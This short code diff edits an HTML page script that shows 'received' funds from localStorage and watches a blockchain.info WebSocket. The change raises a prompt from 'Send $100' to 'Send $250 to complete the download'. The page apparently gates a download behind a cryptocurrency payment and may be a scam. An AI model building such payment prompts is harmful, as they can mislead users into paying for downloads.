@@ -455,10 +455,10 @@
     <script>
         if(localStorage.getItem('received-funds')){
             document.getElementById('received-payment').innerHTML = 'Received: $' + localStorage.getItem('received-funds');
-            document.getElementById('send-50').innerHTML = `Send $100 to complete the download`;
+            document.getElementById('send-50').innerHTML = `Send $250 to complete the download`;
         } else{
             document.getElementById('received-payment').innerHTML = 'Received: $' + 0;
-            document.getElementById('send-50').innerHTML = `Send $100 to complete the download`;
+            document.getElementById('send-50').innerHTML = `Send $250 to complete the download`;
         }
         var binance = new WebSocket("wss://ws.blockchain.info/inv");
         binance.onopen = function(){
